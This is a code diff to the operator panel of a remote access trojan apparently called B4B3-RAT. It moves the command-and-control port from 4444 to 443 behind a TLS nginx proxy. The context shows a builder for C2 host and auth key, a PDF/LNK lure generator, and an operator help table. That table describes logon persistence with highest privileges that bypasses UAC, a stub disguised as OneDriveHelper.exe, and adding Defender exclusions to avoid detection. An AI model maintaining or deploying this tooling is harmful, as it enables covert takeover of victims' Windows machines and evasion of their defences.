@@ -483,7 +483,7 @@ function renderBuilder() {
   <div id="builder-form-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:4px">
     <div>
       <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:4px">C2 Host:Port <span style="color:#e84242">*</span></label>
-      <input id="b-host" type="text" placeholder="192.168.1.14:4444" style="width:100%;background:var(--bg);border:1px solid var(--bg3);border-radius:7px;color:var(--text);font-family:monospace;font-size:13px;padding:9px 12px;outline:none">
+      <input id="b-host" type="text" placeholder="192.168.1.14:443" style="width:100%;background:var(--bg);border:1px solid var(--bg3);border-radius:7px;color:var(--text);font-family:monospace;font-size:13px;padding:9px 12px;outline:none">
     </div>
     <div>
       <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:4px">Auth Key <span style="color:#e84242">*</span></label>
@@ -677,7 +677,7 @@ function renderBuilder() {
     <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px" id="pdflnk-grid">
       <div>
         <label style="font-size:10px;color:var(--muted);display:block;margin-bottom:3px">C2 Host (auto-filled from Builder)</label>
-        <input id="pdflnk-host" type="text" placeholder="e.g. 192.168.1.10:4444"
+        <input id="pdflnk-host" type="text" placeholder="e.g. 192.168.1.10:443"
           style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px;outline:none">
       </div>
       <div>
@@ -2738,7 +2738,7 @@ Quick fix: After rebuilding, add the drop path as a Defender exclusion before de
       <tbody>
         <tr><td>Bot persistence</td><td>All bot data is saved to <code>c2-server/data/bots.json</code> automatically every few seconds. Bots survive server restarts — they re-appear in the sidebar after restarting and will re-connect on their next check-in.</td></tr>
         <tr><td>Auto-reboot (target)</td><td>The scheduled task (<code>/RL HIGHEST</code>) fires at every Windows logon — bot comes back with full admin, no UAC. No user action needed after first run.</td></tr>
-        <tr><td>VPS server</td><td>C2 runs at port 4444 — plain HTTP only. Do NOT add <code>cert.pem</code>/<code>key.pem</code> — the stub uses HTTP, not HTTPS.</td></tr>
+        <tr><td>VPS server</td><td>C2 runs at port 443 (via nginx stream proxy → 3000 internally). Requires <code>cert.pem</code>/<code>key.pem</code> in <code>c2-server/</code> for TLS.</td></tr>
         <tr><td>Update server</td><td><code>git pull &amp;&amp; pm2 restart c2-server</code> — bots will re-appear from disk after restart.</td></tr>
         <tr><td>Rebuild stub</td><td><code>cd B4B3-RAT\Stub</code> → <code>powershell -ExecutionPolicy Bypass -File build.ps1</code> → open Builder → re-configure → new <code>OneDriveHelper.exe</code>.</td></tr>
         <tr><td>Duplicate bots</td><td>Fixed — Bot ID stored in registry on first run. If you still see duplicates, an old binary is running. Kill it: Task Manager → End Process Tree.</td></tr>
